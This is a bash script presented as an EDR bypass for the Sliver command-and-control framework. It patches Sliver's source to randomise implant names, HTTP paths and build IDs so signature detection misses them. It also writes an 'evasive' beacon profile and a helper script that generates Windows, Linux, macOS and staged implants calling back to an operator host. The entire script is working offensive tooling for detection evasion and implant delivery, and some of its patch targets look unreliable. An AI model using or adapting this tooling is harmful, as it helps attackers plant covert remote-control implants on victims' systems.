#!/bin/bash
# EDR bypass script for Sliver C2 - With all required dependencies

set -e
TEMP_DIR=$(mktemp -d)
SLIVER_DIR="${TEMP_DIR}/sliver"
LOG_FILE="/opt/c2/sliver_randomizer.log"

# Function to log messages
log() {
    echo "[$(date +"%Y-%m-%d %H:%M:%S")] $1" | tee -a $LOG_FILE
}

# Function to generate random strings
random_string() {
    local length=${1:-8}
    cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w $length | head -n 1
}

# Install ALL required dependencies
log "Installing dependencies..."
apt-get update >/dev/null 2>&1
apt-get install -y git golang make build-essential zip unzip curl gcc g++ >/dev/null 2>&1

# Clone Sliver repository
log "Cloning Sliver repository..."
git clone --quiet https://github.com/BishopFox/sliver.git $SLIVER_DIR
cd $SLIVER_DIR

# Examine repository structure
log "Analyzing Sliver repository structure..."
IMPLANT_NAME=$(random_string 8)

# Generate randomization values
HTTP_PATH_ONE="/$(random_string 6)/$(random_string 5)"
HTTP_PATH_TWO="/$(random_string 7)/$(random_string 4)"
BEACON_MIN=$((30 + RANDOM % 60))
JITTER=$((10 + RANDOM % 20))

# Find and modify key files - ImplantName
log "Changing implant name to $IMPLANT_NAME..."
grep -l "ImplantName.*sliver" --include="*.go" -r . | while read file; do
    sed -i "s|ImplantName *= *\"sliver\"|ImplantName = \"$IMPLANT_NAME\"|g" "$file"
    log "Modified $file: ImplantName = \"sliver\" → ImplantName = \"$IMPLANT_NAME\""
done

# Modify HTTP transport patterns
log "Modifying HTTP transport patterns..."
grep -l "/path/to/file" --include="*.go" -r . | while read file; do
    sed -i "s|\"/path/to/file\"|\"$HTTP_PATH_ONE\"|g" "$file"
    log "Modified $file: \"/path/to/file\" → \"$HTTP_PATH_ONE\""
done

# Add unique build ID to sliver.go
log "Adding unique build identifiers..."
SLIVER_GO_FILES=$(find . -name "sliver.go")
for file in $SLIVER_GO_FILES; do
    echo -e "\n// Custom build identifier: $(random_string 32)\n// Build timestamp: $(date +%s)" >> "$file"
    log "Added build identifier to $file"
done

# Modify build flags
log "Setting custom build flags..."
grep -l "LinkerStrip" --include="*.go" -r . | while read file; do
    sed -i "s|LinkerStrip = \"-s -w\"|LinkerStrip = \"-s -w -buildid=$(random_string 10)\"|g" "$file"
done

# Build the modified client without compiling the server
log "Building Sliver client only..."
make client-only

# Skip server build if client fails
if [ $? -ne 0 ]; then
    log "Client build failed, creating only the profiles"
else
    log "Client build successful"
    cp -f ./sliver-client /usr/local/bin/
fi

# Create custom profiles directory regardless of build success
mkdir -p /opt/c2/sliver-profiles

# Create evasive profile template
cat > /opt/c2/sliver-profiles/evasive-template.json << EOF
{
    "name": "evasive-$(random_string 4)",
    "http_urls": ["$HTTP_PATH_ONE", "$HTTP_PATH_TWO"],
    "http_headers": [
        "Accept-Language: en-US,en;q=0.$(( 7 + RANDOM % 3 ))",
        "X-Requested-With: XMLHttpRequest",
        "Cache-Control: max-age=$(( 100 + RANDOM % 400 ))"
    ],
    "beacon_interval": $BEACON_MIN,
    "beacon_jitter": $JITTER,
    "kill_date": "$(date -d "+60 days" +%Y-%m-%d)",
    "working_hours": {
        "start": "$(( 6 + RANDOM % 4 )):00",
        "end": "$(( 16 + RANDOM % 6 )):00"
    }
}
EOF

# Create beacon generator script for use with standard Sliver
cat > /opt/c2/generate_evasive_beacons.sh << 'EOF'
#!/bin/bash
# Generate EDR-evasive beacons using randomized profiles

BEACONS_DIR="/opt/beacons"
PROFILE_DIR="/opt/c2/sliver-profiles"
HTTP_HOST=${1:-$(hostname -I | awk '{print $1}')}
HTTP_PORT=${2:-8888}

mkdir -p $BEACONS_DIR

# Generate random profile name
PROFILE="evasive-$(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 8 | head -n 1)"

# Copy template to profiles directory
mkdir -p /root/.sliver/profiles/
cp $PROFILE_DIR/evasive-template.json /root/.sliver/profiles/$PROFILE.json
sed -i "s/\"name\": \"evasive-[a-zA-Z0-9]*\"/\"name\": \"$PROFILE\"/g" /root/.sliver/profiles/$PROFILE.json

echo "[+] Generating Windows beacon..."
sliver generate --profile $PROFILE --http $HTTP_HOST:$HTTP_PORT --os windows --arch amd64 --format exe --save $BEACONS_DIR/windows.exe

echo "[+] Generating Windows DLL beacon..."
sliver generate --profile $PROFILE --http $HTTP_HOST:$HTTP_PORT --os windows --arch amd64 --format shared --save $BEACONS_DIR/windows.dll

echo "[+] Generating Linux beacon..."
sliver generate --profile $PROFILE --http $HTTP_HOST:$HTTP_PORT --os linux --arch amd64 --format elf --save $BEACONS_DIR/linux

echo "[+] Generating macOS beacon..."
sliver generate --profile $PROFILE --http $HTTP_HOST:$HTTP_PORT --os darwin --arch amd64 --format macho --save $BEACONS_DIR/macos

echo "[+] Generating Windows stager..."
sliver generate stager --profile $PROFILE --http $HTTP_HOST:$HTTP_PORT --os windows --arch amd64 --format exe --save $BEACONS_DIR/windows-staged.exe

echo "[+] All beacons generated successfully with evasive profile: $PROFILE"
EOF
chmod +x /opt/c2/generate_evasive_beacons.sh

# Cleanup
log "Cleaning up..."
rm -rf $TEMP_DIR

log "Customization complete."